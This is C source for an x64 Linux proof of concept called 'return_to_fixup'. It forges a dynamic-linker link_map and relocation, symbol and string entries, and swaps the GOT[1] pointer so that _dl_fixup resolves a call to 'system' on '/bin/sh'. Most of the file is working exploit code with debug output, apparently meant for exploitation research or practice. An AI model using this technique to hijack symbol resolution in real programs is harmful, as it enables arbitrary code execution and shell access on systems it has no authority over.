/* 
C POC for return_to_fixup technique (x64 version)
Copyright (C) 2016-2017 WindAvid
Join us now, share software,
You'll be a free hacker!

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

 * return_to_fixup POC example
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define __ELF_NATIVE_CLASS 64
#include "glib_link.h"

// doesn't work, equals to _DYNAMIC after compilation
// extern void _GLOBAL_OFFSET_TABLE_; 
// TODO: hardcoded value now, make variable
ElfW(Word) _GOT_;
int32_t reloc_arg;
//extern void 

void function_alpha()
{
    printf("I am function alpha\n");
    puts("just another call\n");
}

void function_betta()
{
    printf("I am function betta\n");
}

struct link_map _lm;
struct link_map *hook_link_map = &_lm;
struct link_map *orig_link_map;
typedef void **PArray;

/*! copy entire relocation table
 */
void fill_link_map(struct link_map *dst)
{
	memcpy(dst, orig_link_map, sizeof(struct link_map));
}

#define D_PTR(map, i) ((map)->i->d_un.d_ptr + (map)->l_addr)
#define ELFW(type)  _ElfW (ELF, __ELF_NATIVE_CLASS, type)

#define reloc_offset reloc_arg * sizeof (PLTREL)
#define reloc_index  reloc_arg

#define VERSYMIDX(sym)  (DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGIDX (sym))
#define ELF64_R_SYM(i)			((i) >> 32)
#define ELF64_R_TYPE(i)			((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type)		((((Elf64_Xword) (sym)) << 32) + (type))

/*! copy only fields, accessed by the _dl_fixup routine 
 */
void fill_link_map_part(struct link_map *dst, struct link_map *src)
{
    dst->l_addr = src->l_addr;
    // prepare symbol tab entry
    //D_PTR(dst, l_info[DT_SYMTAB]) = D_PTR(src, l_info[DT_SYMTAB]);
    dst->l_info[DT_SYMTAB] = src->l_info[DT_SYMTAB];
    //D_PTR(dst, l_info[DT_STRTAB]) = D_PTR(src, l_info[DT_STRTAB]);
    dst->l_info[DT_STRTAB] = src->l_info[DT_STRTAB];
    //  const PLTREL *const reloc
    //          = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    //D_PTR(dst, l_info[DT_JMPREL]) = D_PTR(src, l_info[DT_JMPREL]);
    dst->l_info[DT_JMPREL] = src->l_info[DT_JMPREL];
    dst->l_info[VERSYMIDX (DT_VERSYM)] = NULL; //src->l_info[VERSYMIDX (DT_VERSYM)]
    dst->l_scope = src->l_scope;
}

int reloc_index = 0;
ElfW(Sym) fake_syment;
const char fake_strent[] = "puts\0system\0is\0fake\0strtab\0section";
ElfW(Rel) fake_relocent;

ElfW(Dyn) fdyn_symtab;
ElfW(Dyn) fdyn_strtab;
ElfW(Dyn) fdyn_jmprel;

void debug_print_constants()
{
	printf("DT_STRTAB: 0x%x\n", DT_STRTAB);
	printf("DT_SYMTAB: 0x%x\n", DT_SYMTAB);
	printf("DT_JMPREL: 0x%x\n", DT_JMPREL);
	printf("versum index: 0x%x\n", VERSYMIDX (DT_VERSYM));

	printf("offset   0: 0x%lx\n", (void *)&(_lm.l_info[0]) - (void*) &_lm);
	printf("offset str: 0x%lx\n", (void *)&(_lm.l_info[DT_STRTAB]) - (void*) &_lm);
	printf("offset sym: 0x%lx\n", (void *)&(_lm.l_info[DT_SYMTAB]) - (void*) &_lm);
	printf("offset rel: 0x%lx\n", (void *)&(_lm.l_info[DT_JMPREL]) - (void*) &_lm);
	printf("offset ver: 0x%lx\n", (void *)&(_lm.l_info[VERSYMIDX (DT_VERSYM)]) - (void*) &_lm);

	printf("offset scope mem: 0x%lx\n", (void *)(&_lm.l_scope_mem) - (void*) &_lm);
	printf("offset scope: 0x%lx\n", (void *)(&_lm.l_scope) - (void*) &_lm);
}

void debug_print_Elf64_Sym(const Elf64_Sym *sym)
{
    printf("Elf64_Sym on %p\n", sym);
    printf("st_name:  %x\n", sym->st_name);
    printf("st_info:  %x\n", sym->st_info);
    printf("st_other: %x\n", sym->st_other);
    printf("st_shndx: %x\n", sym->st_shndx);
    printf("st_value: %lx\n", (uint64_t) sym->st_value);
    printf("st_size:  %x\n", sym->st_size);
}

void debug_print_link_map(struct link_map *lm)
{
    printf("l_addr: %d\n", lm->l_addr);
}

void debug_print(struct link_map *dst)
{
	printf("offset: 0x%lx\n", (void *)&(_lm.l_info[0]) - (void*) &_lm);
    printf("sizeof entry: %d\n", sizeof(ElfW(Dyn)));
    printf("sizeof Rel: %d\n", sizeof(ElfW(Rel)));
    void *p = &dst->l_info[DT_STRTAB];
    void *p0 = &(dst->l_info[0]);
    void *p1 = &(dst->l_info[1]);

    printf("offset 2: %p, 0x%x, %d\n", p0 - (void*)dst, p1 - (void*)dst, DT_STRTAB);
}

/*! define own required structs  
 */
void fill_link_map_fake(struct link_map *dst, struct link_map *src, int reloc_arg)
{
    memset(dst, 0, sizeof(struct link_map));

    dst->l_addr = src->l_addr;
    printf("l_addr: %p\n", dst->l_addr);

    dst->l_info[VERSYMIDX (DT_VERSYM)] = NULL; 
    //const ElfW(Sym) *const symtab
    //    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
	// 1
    //D_PTR(dst, l_info[DT_SYMTAB]) = D_PTR(src, l_info[DT_SYMTAB]);
	// 2
    //memcpy(&fdyn_symtab, src->l_info[DT_SYMTAB], sizeof(fdyn_symtab));
    
    debug_print_Elf64_Sym(&fake_syment);
    //memcpy(&fake_syment, (void *)D_PTR(src, l_info[DT_SYMTAB]), sizeof(ElfW(Sym)));
    // print necessery info here
    fake_syment.st_other = 0;
    fake_syment.st_name = 5;
    fake_syment.st_size = 0x41424344;
    debug_print_Elf64_Sym(&fake_syment);

    fdyn_symtab.d_tag = DT_SYMTAB;
    fdyn_symtab.d_un.d_ptr = (void *)&fake_syment - dst->l_addr; // sinse index will be 1
    dst->l_info[DT_SYMTAB] = &fdyn_symtab; //src->l_info[DT_SYMTAB];
    printf("symtab entry: %d\n", dst->l_info[DT_SYMTAB]);

	//const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
    //D_PTR(dst, l_info[DT_STRTAB]) = D_PTR(src, l_info[DT_STRTAB]);
    // 2
    // memcpy(&fdyn_strtab, src->l_info[DT_STRTAB], sizeof(fdyn_strtab));
    
    fdyn_strtab.d_tag = DT_STRTAB;
    fdyn_strtab.d_un.d_ptr = (void *)&fake_strent - dst->l_addr;
    dst->l_info[DT_STRTAB] = &fdyn_strtab; //src->l_info[DT_STRTAB];

    //const PLTREL *const reloc
    //        = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    //D_PTR(dst, l_info[DT_JMPREL]) = D_PTR(src, l_info[DT_JMPREL]);
    // 2
    //memcpy(&fdyn_jmprel, src->l_info[DT_JMPREL], sizeof(fdyn_jmprel));
	uint64_t r_index = 0;
	uint64_t r_type = 7; // X86_64
    fake_relocent.r_info = (r_index << 32) + r_type;
    fake_relocent.r_offset = _GOT_ + 4 * sizeof(void *);

    fdyn_jmprel.d_tag = DT_JMPREL;
    fdyn_jmprel.d_un.d_ptr = (void *)&fake_relocent - dst->l_addr - reloc_arg * 24;

    dst->l_info[DT_JMPREL] = (ElfW(Addr))&fdyn_jmprel; //src->l_info[DT_JMPREL];


    dst->l_info[VERSYMIDX (DT_VERSYM)] = NULL; //src->l_info[VERSYMIDX (DT_VERSYM)]
    dst->l_scope = (void *)src + 0x358;
    printf("debug: 0x%x\n", ((ElfW(Dyn) *)dst->l_info[DT_STRTAB])->d_tag);
    printf("debug: 0x%x\n", ((ElfW(Dyn) *)dst->l_info[DT_SYMTAB])->d_tag);
    printf("debug: 0x%x\n", ((ElfW(Dyn) *)dst->l_info[DT_JMPREL])->d_tag);
}
/*! print old_link_map address and 
 *  read fake_link_map structure from stdin
 */
void fill_link_map_stdin(struct link_map *dst, struct link_map *src, uint32_t reloc_arg)
{
    // print addr of original link_map and reloc_arg in easy to parse way
    printf("%llu outputs\n", 3);
    printf("%llu %llu %llu\n", (long long int) dst, (long long int) src, (long long int) reloc_arg);
    printf("end %u outputs\n", 3);
    // read number of bytes in fake_link_map
    int payload_length;
    scanf("%u", &payload_length);
    // read fake_link_map itself
    printf("length of fake_link_map is %u\n", payload_length);
    read(0, dst, payload_length);
    printf("debug: 0x%x\n", ((ElfW(Dyn) *)dst->l_info[DT_STRTAB])->d_tag);
    printf("debug: 0x%x\n", ((ElfW(Dyn) *)dst->l_info[DT_SYMTAB])->d_tag);
    //printf("debug: 0x%x\n", ((ElfW(Dyn) *)dst->l_info[DT_JMPREL])->d_tag);
    /*
    printf("0x%x, 0x%x, 0x%x\n", ((ElfW(Dyn) *)dst->l_info[DT_STRTAB])->d_tag,
            ((ElfW(Dyn) *)dst->l_info[DT_SYMTAB])->d_tag, 
            ((ElfW(Dyn) *)dst->l_info[DT_JMPREL])->d_tag);
    */
	printf("filled buffer: %s\n", (char *)dst);
    printf("\nfinish\n");
}

int reloc_state = 0;
int swap_reloc_addr()
{
    if (!reloc_state){
        ((PArray)_GOT_)[1] = hook_link_map;
    } else {
        ((PArray)_GOT_)[1] = orig_link_map;
    }
    reloc_state = !reloc_state;
    return reloc_state;
}

int main(void)
{
	//debug_print_constants();
	//return 0;
    printf("%d: enter address of GOT and puts's reloc_arg in hex\n", 0);
    scanf("%x %x", &_GOT_, &reloc_arg);

	orig_link_map = ((PArray)_GOT_)[1];	
	//fill_link_map(hook_link_map);
	//fill_link_map_part(hook_link_map, orig_link_map);
	//fill_link_map_fake(hook_link_map, orig_link_map, reloc_arg);
	fill_link_map_stdin(hook_link_map, orig_link_map, reloc_arg);
    debug_print(hook_link_map);

    int i = 0;
    printf("I am function alpha, %d\n", i);
    char binsh[] = "/bin/sh";
    puts("/bin/sh");
    swap_reloc_addr();
    // WARNING: in this POC strchr must be called first time here,
    // cause we want a relatively simple demo programm
    // if puts was called earlie, POC won't work (cuz dl_dixup won't be called)
	// also, LD_BIND_NOW must not be set, cuz dl_fixup won't be called either
    char *pos = strchr(binsh, 's');
    printf("s is on %d place\n", pos - binsh);
    return 0;
}
